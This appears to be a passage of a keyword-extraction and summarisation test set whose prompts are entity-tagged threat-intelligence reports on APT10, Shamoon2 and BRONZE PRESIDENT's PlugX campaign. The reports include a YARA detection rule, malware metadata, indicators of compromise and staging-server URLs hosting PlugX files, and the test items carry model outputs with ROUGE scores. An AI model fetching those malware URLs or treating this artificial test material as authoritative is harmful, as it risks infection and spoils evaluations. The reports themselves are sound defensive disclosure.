condition : uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < 300 [PERSON] KB and } [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 29rule YARA_CN_APT10_UPPERCUT_libcurl_injector { meta : description = \u201c Malicious [ORG] DLL libcurl.dll launched using benign GUP.exe to inject [ORG] UPPERCUT payload by APT10 in [DATE] 2018 campaign \u201d author = \u201c [ORG] Insikt [ORG] Group , [ORG] Recorded [ORG] Future \u201d tlp = \u201c white \u201d date = \u201c 2019 [DATE] - [DATE] 01 [DATE] - 16 \u201d $ s1 = \u201c hemas.microsoft.com/SMI/2005/WindowsSettings\\\u201d>true</dpiAware></windowsSettings></application></ assembly > \u201d fullword ascii $ s2 = \u201c curity><requestedPrivileges><requestedExecutionLevel level=\\\u201dasInvoker\\ \u201d uiAccess=\\\u201dfalse\\\u201d></ requestedExecutionLevel></requeste \u201d ascii $ s3 = \u201c GUP.exe \u201d fullword ascii $ s4 = \u201c winsta0\\\\Winlogon \u201d fullword ascii $ s5 = \u201c operator co_await \u201d fullword ascii $ [MONEY] s6 = \u201c : : $ :( : , : 0:4:@:D : H : L :P : T : X:\\\\ : \u201d fullword ascii $ [MONEY] s7 = \u201c qwertyuiop \u201d fullword ascii $ s8 = \u201c 5j5$7(7,7074787<7@7D7H7L7P7T7X7\\\\7`7d7h7l7p7t7x7|7 \u201d fullword ascii $ s9 = \u201c < assembly [PERSON] xmlns=\\\u201durn : schemas - microsoft - com : asm.v1\\ \u201d [PERSON] manifestVersion=\\\u201d1.0\\\u201d><trustInfo [PERSON] xmlns=\\\u201durn : schemas - microsoft - com : asm.v3 \u201d ascii $ s10 = \u201c CNSEOJAN286 \u201d fullword ascii $ s11 = \u201c vileges></security></trustInfo><application [PERSON] xmlns=\\\u201durn : schemas - microsoft - com : asm . v3\\\u201d><windowsSettings><dpiAware xmlns=\\\u201dhttp:/ \u201d ascii $ s12 = \u201c vLUkkDvRzmLFNWZ \u201d fullword ascii condition : uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < [CARDINAL] 400 [PERSON] KB and } [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 30Appendix D \u2014 Malware MetadataInfection Chain 1MD5 Compilation Timestamp 1992 - 06 - 19 22:22:17 DescriptionPE32 executable for MS Windows ( [ORG] GUI ) [ORG] Intel 80386 [ORG] 32-bit692.27KBunins000.exe renamed to CASTSP.exe - Legitimate [ORG] PDF [ORG] - XChange uninstaller . A valid and signed application that utilizes Compilation Timestamp 2018 - 08 - 28 08:31:00 DescriptionPE32 executable for MS Windows ( [ORG] DLL ) ( [ORG] GUI ) [ORG] Intel 80386 [CARDINAL] 32 - bit108KBversion.dll - Malicious [ORG] DLL , sideloaded using legitimate binary to decrypt , decompress , and Compilation Timestamp 2018 - 05 - 04 07:11:30 DescriptionPE32 executable for MS Windows ( [ORG] GUI ) [ORG] Intel 80386 32 - bit 29.35KBTailoredDeploy.Host.exe renamed to CASTSP.exe - Legitimate Microsoft [PERSON] Visual [PERSON] Studio [CARDINAL] 6.0 binary . When executed on host device , sideloads colocated malicious [ORG] DLL to kickstart injection of malicious payload [LAW] Compilation [LAW] Timestamp [LAW] 2018 [LAW] - [LAW] 09 [LAW] - [LAW] 06 02:43:53 Descriptionvcruntime140.dll99.5KB - Malicious [ORG] DLL , sideloaded using legitimate binary to decrypt , decompress , and Description [ORG] - ASCII text77 bytesiisstart.aspxServer - side component of [GPE] China Chopper ASPX payload . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 33Appendix E \u2014 MITRE ATT&CK MappingThe MITRE ATT&CK grid populated below identifies the techniques utilized by APT10 attackers in the targeting outlined in this research . MITRE ATT&CK MappingInitial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral [PERSON] MovementCollectionExfiltrationCommand And [ORG] ControlDrive - by [ORG] CompromiseCMSTPAccessibility [ORG] FeaturesAccess [ORG] Token [ORG] ManipulationAccess Token ManipulationAccount ManipulationAccount DiscoveryExploit Public - Facing ApplicationCommand - Line InterfaceAccount ManipulationAccessibility FeaturesBinary PaddingBrute ForceApplication Window DiscoveryHardware AdditionsCompiled HTML FileAppCert DLLsReplication Through Removable MediaControl Panel ItemsAppInit DLLsAppCert DLLsAppInit DLLsBITS JobsCredential DumpingBrowser Bookmark DiscoveryBypass User Account ControlCredentials in [ORG] FilesFile [ORG] and [ORG] Directory [ORG] DiscoveryLog - on [ORG] ScriptsSpearphishing [ORG] AttachmentDynamic [ORG] Data [ORG] ExchangeApplication [ORG] ShimmingApplication [ORG] ShimmingCMSTPCredentials in RegistryNetwork Service ScanningPass the HashSpearphishing [ORG] LinkExecution through APIAuthentication PackageBypass User Account ControlCode SigningExploitation for Credential AccessNetwork Share DiscoveryPass [ORG] the [ORG] TicketApplication [ORG] Deployment [ORG] Exploitation [ORG] of [ORG] Remote [ORG] ServicesAudio CaptureAutomated ExfiltrationCommonly Used [ORG] PortAutomated CollectionData CompressedCommunication Through Removable MediaClipboard DataData EncryptedConnection ProxyData from [ORG] Information [ORG] RepositoriesData from [ORG] Local [ORG] SystemData from [ORG] Network [ORG] Shared [ORG] DriveData [ORG] Transfer [ORG] Size [ORG] LimitsExfiltration Over Alternative Protocol Exfiltration Over Command and [ORG] Control [ORG] Channel [ORG] Exfiltration Over Other Physical MediumCustom Command and [ORG] ProtocolData EncodingData ObfuscationDomain FrontingSpearphishing via [ORG] ServiceSupply [ORG] Chain [ORG] CompromiseExecution through Module Load Exploitation for Client ExecutionBITS JobsBootkitTrusted RelationshipGraphical User InterfaceBrowser ExtensionsEscalation Extra Window Permissions WeaknessDLL Search Order HijackingCompiled HTML [ORG] FileForced [ORG] AuthenticationNetwork [ORG] SniffingRemote [ORG] Desktop [ORG] ProtocolData from Removable MediaExploitation for PrivilegeComponent FirmwareHookingPassword Policy DiscoveryRemote File [ORG] CopyData StagedComponent Object Model HijackingInput CapturePeripheral Device DiscoveryRemote ServicesEmail CollectionScheduled TransferFallback ChannelsValid AccountsInstallUtilLSASS DriverMshtaPowerShellChange [ORG] Default [ORG] File [ORG] AssociationControl [ORG] Panel [ORG] ItemsKerberoastingPermission [ORG] Groups [ORG] DiscoveryReplication [ORG] Through [ORG] Removable [ORG] MediaInput [ORG] CaptureComponent FirmwareHookingDCShadowLLMNR / NBT - NS PoisoningProcess DiscoveryShared WebrootMan in [ORG] the [ORG] BrowserComponent [ORG] Object [ORG] Model [ORG] HijackingImage [ORG] File ExecutionDeobfuscate [ORG] / Decode [ORG] Files or [ORG] InformationNetwork [ORG] SniffingQuery [ORG] RegistryTaint Shared ContentScreen CaptureCreate AccountOptions InjectionDisabling Security ToolsPassword Filter DLLRemote System DiscoveryThird - party SoftwareVideo CaptureMulti - hop ProxyMulti [ORG] - Stage [ORG] ChannelsMultiband CommunicationMultilayer EncryptionRemote Access ToolsRemote File CopyStandard Application Standard Non - Application Layer ProtocolUncommonly Used PortWeb ServiceRegsvcs / RegasmDLL [PERSON] Search [PERSON] Order HijackingNew ServiceDLL Search Order HijackingPrivate KeysSecurity Software DiscoveryWindows Admin SharesRegsvr32Rundll32External Remote ServicesPath InterceptionFile System Permissions WeaknessPort MonitorsScheduled TaskHidden Files and DirectoriesProcess InjectionScriptingService ExecutionSigned Binary [ORG] Proxy [ORG] ExecutionHookingHypervisorImage [ORG] File [ORG] Execution [ORG] Options InjectionScheduled TaskService Registry Permissions WeaknessDLL Side - LoadingExploitation for Memory InjectionFile DeletionFile Permissions [CARDINAL] ModificationTwo - Factor Authentication InterceptionSystem Information DiscoveryWindows Remote Connections DiscoverySystem Owner / User DiscoverySystem Service DiscoverySystem Time DiscoverySID - History InjectionFile System Logical OffsetsSigned Script Proxy Execution [PERSON] Logon ScriptsValid [PERSON] AccountsHidden [PERSON] Files and [ORG] DirectoriesThird - party SoftwareLSASS DriverWeb ShellTrusted Developer UtilitiesModify Existing ServiceUser ExecutionNetsh Helper DLLWindows Management [ORG] ManagementNew [ORG] ServiceOffice [ORG] Application [ORG] StartupXSL [ORG] Script [ORG] ProcessingPath InterceptionPort MonitorsRedundant AccessRegistry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] FolderScheduled TaskScreensaverSecurity Support ProviderService Registry Permissions WeaknessShortcut ModificationSIP and Trust Provider HijackingSystem FirmwareTime ProvidersValid AccountsWeb ShellWindows Management InstrumentationEvent SubscriptionWinlogon Helper DLLImage File Execution Options InjectionIndicator BlockingIndicator Removal from [ORG] ToolsIndicator [ORG] Removal on HostIndirect Command ExecutionInstall Root CertificateInstallUtilMasqueradingModify RegistryMshtaNetwork Share Connection RemovalNTFS File AttributesObfuscated Files or [ORG] InformationProcess Doppelg\u00e4ngingProcess HollowingProcess InjectionRedundant AccessRegsvcs / RegasmRegsvr32RootkitRundll32ScriptingSigned Binary Proxy ExecutionSigned Script Proxy ExecutionSIP and Trust Provider HijackingSoftware PackingTemplate InjectionTimestompTrusted Developer [ORG] UtilitiesValid [ORG] AccountsWeb ServiceXSL Script ProcessingLEGENDTechniques observed in this campaign and noted as previously used by APT10New techniques observed in this campaign not previously noted as usedTechniques not observed during this campaign previously used by APT10Highlighted with green are the new techniques used by APT10 identified during this campaign . In yellow are the techniques that were observed during this campaign and had previously been associated with APT10.In blue are techniques used by APT10 in previous campaigns that were n\u2019t observed in this campaign . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 34Appendix F \u2014 Visma StatementHow Visma Managed the [ORG] CaseAll timelines and methods are documented in this report from [ORG] Recorded [ORG] Future and Rapid7.Visma \u2019s intelligence systems gave them warning about the theft ( a threat hunter from [PERSON] Rapid7 used [LOC] the [LOC] Visma [LOC] Global [LOC] Responsible [LOC] Disclosure [LOC] Policy ) . Visma correlated the intelligence from [PERSON] Rapid7 against their internal alerts and mitigated the threat . They soon confirmed that none of their clients \u2019 systems were affected . [ORG] The [ORG] Visma [ORG] Corporate [ORG] Security [ORG] Incident [ORG] Response [ORG] Team ( [ORG] Visma [ORG] CSIRT ) worked closely with their Product Security Operations Center ( PSOC ) , [PERSON] NSM [PERSON] NorCERT , as well as the police . After initial attribution ( using data from [ORG] Recorded [ORG] Future , among other systems ) , [GPE] Visma decided to contract an external partner ( [ORG] Recorded [ORG] Future ) to dig deeper into the incident report and gather additional intelligence in order to ensure proper attribution to better understand this threat actor . In this case , no client data was compromised , and [GPE] Visma chose not to issue a general alert before they had conclusive evidence on who performed the theft . They assisted [ORG] NSM [ORG] NorCERT and others in the investigation and general cleanup of this case . Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 35RetrospectiveVisma does not see any reason to question [ORG] Recorded [ORG] Future or [PERSON] Rapid7 \u2019s attribution in this case , but [GPE] Visma wants to give a general warning about general nation - state - backed advanced persistent threat actors that seem to target businesses and governments alike with their advanced attack methods . From [GPE] Visma \u2019s experience and data , it can be observed that most threat actors seem to have their own methods , tools , and playbooks that may be used to identify them when carrying out a decent analysis of their actions . Their motivation for these actions is sometimes quite tricky to understand , but most can probably be classified as espionage , preparations for later hybrid warfare operations , or similar . Visma sees evidence of similar attempts against their systems quite often , but since this one was successful in stealing something and was quite advanced , they want to put out a warning about this particular threat actor . They are thankful for the guidance and advice from [ORG] NSM [ORG] NorCERT , police , and other cooperating parties in this case and urge all business entities to explore the opportunities that are available in [ORG] CERT cooperation . [GPE] Visma has transparency as a carrying principle for their business and will publish data on nation - state and criminal attacks against them both now and in the future . They will share information to ensure public awareness of these matters and to motivate others to do the same . About Recorded FutureRecorded Future arms security teams with the only complete threat intelligence solution powered by patented machine learning to lower risk . Our technology automatically collects and analyzes information from an unrivaled breadth of sources and provides invaluable context in real time and packaged for human analysis or integration with security technologies . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 36", "generated_text": "the report; an intrusion; at least three companies; the US; Europe; the attackers; Norwegian; Visma; the attack; Citrix; LogMeIn; trochilus; the Trochilus malware; DLL sideloading; IP; access; data; Dropbox; Dropbox; documents; the third victim; an international apparel company; intellectual property law; intellectual property law; security; the report; the Chinese intelligence agency; MSS; shell companies; intellectual property; leverage; threat actors; activity; at least 2016; the threat actor; the group.", "ref_text": "<START-1>Recorded Future and Rapid7 analyzed intrusions by the Chinese threat actor APT10 against a Norwegian MSP Visma, a US law firm, and an international apparel company.The attackers gained initial access through stolen credentials to Citrix servers and moved laterally. They used DLL sideloading to deploy malware like Trochilus and UPPERCUT. APT10 used legitimate tools like Mimikatz, BITSAdmin, cURL, and WinRAR for enumeration, credential harvesting, and data exfiltration. Data was exfiltrated to Dropbox accounts. Attribution was made to APT10 based on tactics, techniques, and procedures consistent with their previous campaigns, including DLL sideloading, UPPERCUT and Trochilus malware, infrastructure links, and targeting organizations with Chinese interests. The attacks aimed to steal intellectual property and gain commercial advantage, in line with APT10's espionage mission under China's Ministry of State Security. Defensive recommendations include monitoring VPN endpoints, Yara rules, access to Citrix servers, and other tactics to detect similar intrusions. So in summary, it was a cyberespionage campaign by APT10 relying on credential theft, lateral movement, custom malware, and cloud services to infiltrate and steal data. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4385964912280702, "gpt3/lexical/rouge_rouge2": 0.1588235294117647, "gpt3/lexical/rouge_rougeL": 0.22222222222222224, "gpt3/lexical/rouge_rougeLsum": 0.22222222222222224, "gpt3_generated_text": ["This article discusses a cyberespionage campaign conducted by a Chinese state-sponsored threat actor, APT10, targeting at least three companies in the US and Europe. The targeted companies include a Norwegian company called Visma, an international apparel company, and a US law firm specializing in intellectual property law. The attackers gained access to the networks through the use of Citrix and LogMeIn remote-access software with stolen user credentials. They then deployed malware and backdoors to gain further access and privilege escalation. The attackers used Dropbox to exfiltrate data from the compromised networks. It is believed that APT10 is the most significant Chinese state-sponsored cyber threat to global corporations and that these operations are being run by the Chinese intelligence agency, the Ministry of State Security (MSS). The MSS has conducted an extensive campaign against managed IT service providers (MSPs) to steal intellectual property and conduct secondary attacks on their clients. The report emphasizes the importance of industry collaboration in identifying and protecting against such threats."]}, {"split_name": "test", "sample_id": "test_91", "prompt_text": "Extract the keywords: Under [PERSON] Attack ? Call ( [CARDINAL] 844 ) END.DDoSM E N UAdditional Insights on Shamoon2B y N e a l D e n n i s o n [DATE] 0 [DATE] 2 [DATE] / [DATE] 2 [DATE] 1 [DATE] / [DATE] 2 [DATE] 0 [DATE] 1 [DATE] 7 . P o s t e d i n a n a l y s i s , a t t a c k l i f e c y c l e , I n t e r e s t i n g R e s e a r c h , M a l w a r e , t h r e a t a n a l y s i s .IBM analysts recently unveiled a   rst look at how threat actors may have placed [PERSON] Shamoon2 malware on systems in [GPE] Saudi [GPE] Arabia . Researchers showcased a potential malware lifecycle which started with spear phishing and eventually led to the deployment of the disk - wiping malware known as [LOC] Shamoon . Their research showcased a set of downloaders and domains that could potentially lead to a more extensive malware distribution campaign . While researching elements in the [ORG] IBM report , [ORG] ASERT discovered additional malicious domains , [ORG] IP addresses , and artifacts . The basic functionality of the new documents and their [ORG] PowerShell components matched what was previously disclosed . For more information on the overall capabilities of the malware , please review [ORG] IBM \u2019s ongoing research . It is our hope that by providing additional indicators , end - point investigators and network defenders will be able to discover and mitigate more [ORG] Shamoon2 related compromises . Initial DiscoveriesThe following new samples were likely delivered via similar spear phishing campaigns as described in [ORG] IBM \u2019s research . All [CARDINAL] three shared the same IPs and URLs , also provided below . These samples were located by pivoting on document attributes . In this case , a sample from the [ORG] IBM report indicated the document [CARDINAL] 69.87.223[.]26 5.254.100[.]200URLsanalytics - google[.]org:69 / checkFile.aspx analytics - google[.]org [CARDINAL] 69.87.223[.]26:8080 / pThe following is a screenshot of a macro - enabled document captured from sample found get.adobe.go - microstf[.]com hosted at 104.218.120[.]128 around the time this campaign was ongoing , [DATE] November [DATE] 2016.Researching the domain go - microstf[.]com , hosted at [DATE] 45.63.10[.]99 , revealed yet another iteration of malicious executables . In this case , a URL used to download the [ORG] PowerShell component shared a naming convention found in the [ORG] IBM report , url and connected to the [ORG] IP address used by 69.87.223[.]26URLsgo - microstf[.]com [CARDINAL] 69.87.223[.]26:8080 / eiloShaegae1 go - microstf[.]com / check le.aspxThe domain go - microstf[.]com was originally set up to spoof [ORG] Google [ORG] Analytics login page . The following screenshot is from the malicious domain : Possible Connections to [NORP] Iranian state - sponsored [ORG] KittensFinally , research yielded a relatively unique sample . This particular iteration was submitted to [ORG] VirusTotal on [DATE] September 16 , [DATE] 2016 . The majority of samples analyzed to date were submitted no earlier than mid - October , with most being submitted in [DATE] January [DATE] 2017 or later . We were able to discover this particular version by diving further into connections to analytics - google[.]org . Unlike newer samples , this one created a unique   le \u2018 sloo.exe \u2019 . The   le was created at C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\sloo.exe . In addition to this   le , the sample also contacted [CARDINAL] 104.238.184[.]252 for the [ORG] PowerShell executable . Researchers at [GPE] Palo [GPE] Alto have attributed sloo.exe and related activities to threat actors of a likely [NORP] Iranian state - sponsored origin which they [ORG] \u2019ve named [PERSON] Magic [PERSON] Hound . The group [PERSON] Magic [PERSON] Hound is linked via infrastructure and tools to the Rocket Kitten threat actor group although [GPE] Palo [GPE] Alto can not con rm the extent of any relationship between the [CARDINAL] two groups . [PERSON] Dell [PERSON] Secureworks analysts recently concluded that domains discussed in the [ORG] IBM report were linked to the [NORP] Iranian PupyRAT usage . In addition , Dell analysts have assessed with high - con dence these activities are attributable to [NORP] Iranian state- 5.254.100[.]200URLsanalytics - google[.]org:69 / checkFile.aspxConclusionThese additional IOCs will hopefully provide more context into the ongoing threat . The link to possible [NORP] Iranian threat actors supports ongoing analysis that [PERSON] Shamoon2 was perpetrated by [NORP] Iranian state - sponsored threat actors . The last sample discussed may be malware-0 or at least part of the overall development and [CARDINAL] 69.87.223[.]26 [CARDINAL] 5.254.100[.]200 [CARDINAL] 45.63.10[.]99 104.238.184[.]252URLsanalytics - google[.]org:69 / checkFile.aspx analytics - google[.]org [CARDINAL] 69.87.223[.]26:8080 / p go - microstf[.]com [CARDINAL] 69.87.223[.]26:8080 / eiloShaegae1 get.adobe.go - microstf[.]com go - microstf[.]com / check le.aspxShare this : Share89Share6Tweet3 pointsTags : disk wiper , IOCs , [GPE] Iran , [GPE] Saudi [GPE] Arabia , [GPE] Shamoon , Shamoon2Leave a commentName * E - mail * WebsiteS [ORG] U [ORG] B [ORG] M [ORG] I T C O M M E N TFirst NameSUBSCRIBE TO THIS BLOGFirst NameLast NameCompanyEmailSUBSCRIBEArbor \u2019s [ORG] Security [ORG] Engineering [ORG] & [ORG] Response [ORG] Team ( [ORG] ASERT ) delivers world - class network security research and analysis for the bene t of [DATE] today \u2019s enterprise and network operators . ASERT engineers and researchers are part of an elite group of institutions that are referred to as \u2018 super remediators \u2019 and represent the best in information security . [ORG] ASERT has both visibility and remediation capabilities at nearly every tier [CARDINAL] one operator and a majority of service provider networks globally . [ORG] ASERT shares operationally viable intelligence with [CARDINAL] hundreds of international Computer Emergency Response Teams ( CERTs ) and with [CARDINAL] thousands of network operators via in - band security content feeds . [ORG] ASERT also operates the world\u2019slargest distributed honeynet , actively monitoring Internet threats around the clock and around the globe via ATLAS , Arbor \u2019s global network of sensors : url \u00ae TAG CLOUDCSAC APT [PERSON] Buhtrap [PERSON] Banking [PERSON] Trojans tra c [GPE] Russia malware Internet Protocol hijack Facebook [ORG] DNS Denial- of - service attack Crypto Bot Wikileaks [GPE] Iran [GPE] China Armageddon YouTube Security Botnet Internet service provider Internet tra c Google", "generated_text": "Shamoon; systems; Saudi Arabia; spear; phishing campaigns; IP; the malware; PowerShell components; connections; Google Analytics; the malware; the IP address; contacts; a t; a C2; IP addresses; use; the attackers; the main attack; the attackers; a server; the C2; the y.", "ref_text": "<START-1>The document provides additional insights and indicators of compromise related to the Shamoon2 malware attacks against Saudi Arabia. Researchers discovered new malicious documents, domains, IP addresses, and artifacts related to the distribution of Shamoon2. The basic functionality matches what was previously disclosed about the malware. New indicators suggest possible connections between Shamoon2 and Iranian state-sponsored threat actors, supporting analysis that Iran was behind the Shamoon2 attacks. One sample dates back to September 2016, earlier than most other known Shamoon2 samples, suggesting it may have been involved in early development. The domains, IPs, and URLs disclosed provide additional context about the threat and can help network defenders discover and mitigate related compromises. Sharing these new indicators of compromise can assist incident response efforts and analysis of the Shamoon2 campaign attributed to Iranian state-sponsored actors.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5381818181818182, "gpt3/lexical/rouge_rouge2": 0.1978021978021978, "gpt3/lexical/rouge_rougeL": 0.3054545454545454, "gpt3/lexical/rouge_rougeLsum": 0.3054545454545454, "gpt3_generated_text": ["This article provides insights into the Shamoon2 malware attack on systems in Saudi Arabia, with a focus on the malware lifecycle starting with spear phishing campaigns. The research showcases the potential distribution campaign of the malware through downloaders and domains, and the discovery of additional malicious domains, IP addresses, and artifacts. The article also discusses the connections to Iranian state-sponsored threat actors and their potential involvement in the Shamoon2 attack. The findings suggest a link to possible Iranian threat actors and support ongoing analysis that the attack was perpetrated by Iranian state-sponsored threat actors. The article also highlights the discovery of a unique sample submitted to VirusTotal, potentially related to Iranian state-sponsored threat actors. Overall, the article provides valuable insights and additional indicators for end-point investigators and network defenders to discover and mitigate Shamoon2 related compromises."]}, {"split_name": "test", "sample_id": "test_92", "prompt_text": "Extract the keywords: www.secureworks.com /blog / bronze - president - targets - russian - speakers - with - updated - plugx [ORG] BRONZE PRESIDENT Targets [NORP] Russian Speakers with Updated PlugX Counter Threat Unit Research Team \u22ee \u22ee [CARDINAL] 4/27/2022The threat group \u2019s targeting shift could reflect a change in [GPE] China \u2019s intelligence collection requirements due to the war in [GPE] Ukraine . Wednesday , [DATE] April 27 , [DATE] 2022 By : [ORG] Counter [ORG] Threat [ORG] Unit [ORG] Research TeamGovernment - sponsored threat actors collect intelligence to benefit their country , and changes to the political landscape can impact the collection requirements . The war in [GPE] Ukraine has prompted many1/6countries to deploy their cyber capabilities to gain insight about global events , political machinations , and motivations . This desire for situational awareness often extends to collecting intelligence from allies and \u201c friends , \u201d which could explain why Secureworks \u00ae Counter Threat Unit \u2122 ( CTU ) researchers detected what appears to be an attempt by [GPE] China to deploy advanced malware to computer systems of [NORP] Russian officials . In [DATE] March [DATE] 2022 , CTU \u2122 researchers analyzed a malicious executable file masquerading as a Russian- language document . The filename is [ORG] \u0411\u043b\u0430\u0433\u043e\u0432\u0435\u0449\u0435\u043d\u0441\u043a [ORG] - [ORG] \u0411\u043b\u0430\u0433\u043e\u0432\u0435\u0449\u0435\u043d\u0441\u043a\u0438\u0439 \u043f\u043e\u0433\u0440\u0430\u043d\u0438\u0447\u043d\u044b\u0439 [PERSON] \u043e\u0442\u0440\u044f\u0434.exe ( \" [WORK_OF_ART] Blagoveshchensk [WORK_OF_ART] - [WORK_OF_ART] Blagoveshchensk [WORK_OF_ART] Border [WORK_OF_ART] Detachment.exe \" ) , but the default settings on Windows system do not display the .exe file extension . The file uses a portable document file ( [ORG] PDF ) icon for credibility . [PERSON] Blagoveshchensk is a [NORP] Russian city close to the [GPE] China border and is home to the [ORDINAL] 56th [EVENT] Blagoveshchenskiy [EVENT] Red [EVENT] Banner [EVENT] Border [EVENT] Guard [EVENT] Detachment . This connection suggests that the filename was chosen to target officials or military personnel familiar with the region . The heavily obfuscated executable file downloads additional files from a staging server at [CARDINAL] 107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 ( see [LAW] Table [LAW] 1).Target file on staging server http : //107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 / eu / Report.pdf http : //107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 / eu / FontEDL.exe Legitimate signed file http : //107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 / eu / DocConvDll.dll Malicious [ORG] DLL loader http : //107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 / eu / FontLog.datComment Decoy documentEncrypted payload ( likely PlugX)Table [CARDINAL] 1 . [PERSON] Files downloaded from staging server . The executable file displays the decoy document ( see Figure [CARDINAL] 1 ) to the victim . This document is written in [LANGUAGE] English and appears to be legitimate , although CTU researchers were unable to locate the original source . It describes the migratory pressure and asylum applications in countries that border [GPE] Belarus ( [GPE] Lithuania , [GPE] Latvia , and [GPE] Poland ) and discusses [ORG] European [ORG] Union ( [ORG] EU ) sanctions against [GPE] Belarus at [DATE] the [DATE] beginning [DATE] of [DATE] March [DATE] 2022 . CTU researchers are unclear why a file with a [NORP] Russian filename downloads an [LANGUAGE] English - language document.2/6Figure 1 . Decoy document displayed to victims . ( Source : Secureworks)The other [CARDINAL] three files downloaded from the staging server are typical of the [GPE] China - based [ORG] BRONZE PRESIDENT threat group 's use of [ORG] DLL search order hijacking to execute PlugX malware payloads . The inclusion of the ping command with the \" -n [CARDINAL] 70 \" option ( see Figure [CARDINAL] 2 ) adds a significant delay before executing the legitimate signed file . The [ORG] IP address used for the ping command is [ORG] Google 's public [ORG] DNS service . Figure [CARDINAL] 2 . Using ping command to incorporate delay . ( Source : Secureworks)The legitimate signed file originates from [GPE] UK - based [ORG] Global [ORG] Graphics [ORG] Software [ORG] Ltd. Because it is vulnerable to [ORG] DLL search order hijack , it imports the malicious DocConvDll.dll [ORG] DLL loader . This [ORG] DLL exports [CARDINAL] eight functions , several of which use seemingly random names and contain no useful instructions . The only export called by the parent executable is [PERSON] createSystemFontsUsingEDL ( see Figure 3).3/6Figure [CARDINAL] 3 . Exported functions of [ORG] DocConvDll.dll . ( Source : Secureworks)The [GPE] createSystemFontsUsingEDL function loads , decrypts , and executes [ORG] FontLog.dat . The .dat sample obtained by CTU researchers was corrupt , but based on similar campaigns the file is likely a PlugX payload . However , analysis of the loader suggests that the malware creates a directory structure under C:\\ProgramData ( C:\\ProgramData\\Fuji Xerox\\Fonts\\ ) and then copies the [CARDINAL] three files that [ORG] DLL side - load and execute the payload to this directory . Once PlugX is installed , the malware provides access to the compromised host to extract sensitive system information , upload and download files , and execute a remote command shell . The staging server ( [CARDINAL] 107 . [CARDINAL] 178 . [CARDINAL] 71 . [CARDINAL] 211 ) hosts the zyber - i . com domain . This domain has been implicated in a broad PlugX campaign targeting [NORP] European diplomatic entities . The domain was hosted on [CARDINAL] 103 . [CARDINAL] 107 . [CARDINAL] 104 . [CARDINAL] 19 from [DATE] March [DATE] 2 [DATE] - 13 , when it served a similarly named group of files for [ORG] DLL search order hijack . A [ORDINAL] third - party report links the campaign to the locvnpt . com domain . Another report associates the locvnpt . com domain with attacks in [DATE] 2020 against the [FAC] Vatican that CTU researchers attribute to [ORG] BRONZE PRESIDENT . This [DATE] 2020 campaign also used customized decoy documents and downloaded PlugX .dat files that were loaded by [ORG] DLL search order hijack . The locvnpt . com domain was hosted on 2EZ Networks ( [ORG] IP address [CARDINAL] 167 . [CARDINAL] 88 . [CARDINAL] 177 . [CARDINAL] 151 ) in [DATE] September [DATE] 2020 . BRONZE PRESIDENT extensively used that company 's [ORG] IP range in a [DATE] 2020 campaign targeting [GPE] Hong [GPE] Kong , [GPE] Myanmar , and [GPE] Vietnam ( see Figure [DATE] 4).4/6Figure [DATE] 4 . BRONZE PRESIDENT network infrastructure used in [DATE] 2020 campaign . ( Source : Secureworks)BRONZE PRESIDENT appears to be changing its targeting in response to the political situation in [LOC] Europe and the war in [GPE] Ukraine . The threat group has primarily focused on [LOC] Southeast [LOC] Asia , gathering political and economic intelligence valuable to [GPE] the People 's [GPE] Republic [GPE] of [GPE] China ( [GPE] PRC ) . Targeting Russian- speaking users and [NORP] European entities suggests that the threat actors have received updated tasking that reflects the changing intelligence collection requirements of the [LOC] PRC.To mitigate exposure to this malware , CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in [LAW] Table [LAW] 2 . Note that [ORG] IP addresses can be reallocated . The domains , [ORG] IP addresses , and URLs may contain malicious content , so consider the risks before opening them in a browser . Indicator Malicious [LANGUAGE] Russian - language executable masquerading as [ORG] PDF , downloads PlugX Malicious [LANGUAGE] Russian - language executable masquerading as [ORG] PDF , downloads PlugX Malicious [LANGUAGE] Russian - language executable masquerading as [ORG] PDF , downloads PlugX Malicious [ORG] DLL ( DocConvDll.dll ) that loads PlugX Malicious [ORG] DLL ( DocConvDll.dll ) that loads PlugX Malicious [ORG] DLL ( DocConvDll.dll ) that loads PlugX5/6Indicator PlugX payload ( FontLog.dat)PlugX payload ( FontLog.dat)PlugX payload ( FontLog.dat)Staging server that hosted PlugX files Staging server that hosted PlugX files Associated with [ORG] BRONZE PRESIDENT PlugX activity Associated with [ORG] BRONZE PRESIDENT PlugX activity PlugX [ORG] DLL loader PlugX payload PlugX C2 server6/6", "generated_text": "the document; China; BRONZE PRESIDENT; the incident; Russia; the war; intelligence; requirements; the war; the document; the decoy document; files; a staging server; 107.178.71.211; a DLL; search order hijacking; PlugX malware; the ping command; the ping command; a report; the group; days; days; the war; Russian speakers; changes; political machinations; motivations.", "ref_text": "<START-1>The report details an attack campaign attributed to the China-based threat group BRONZE PRESIDENT, which targeted Russian speakers with updated PlugX malware. In March 2022, researchers analyzed a malicious executable file masquerading as a Russian-language document about a Russian border detachment. The file's name and content suggest it was crafted to target officials familiar with the Russia-China border region. When executed, the file displayed a decoy English-language document about EU sanctions on Belarus while downloading additional files from a staging server. Analysis revealed this to be a typical PlugX attack involving DLL search order hijacking to execute the malware payload. The server also hosted domains linked to previous BRONZE PRESIDENT campaigns using similar techniques. The targeting of Russian speakers and European entities indicates the group has likely received updated intelligence requirements from China due to the war in Ukraine. Rather than its usual Southeast Asian targets, BRONZE PRESIDENT appears to be gathering political and military intelligence of value to China during this period. The report provides indicators of 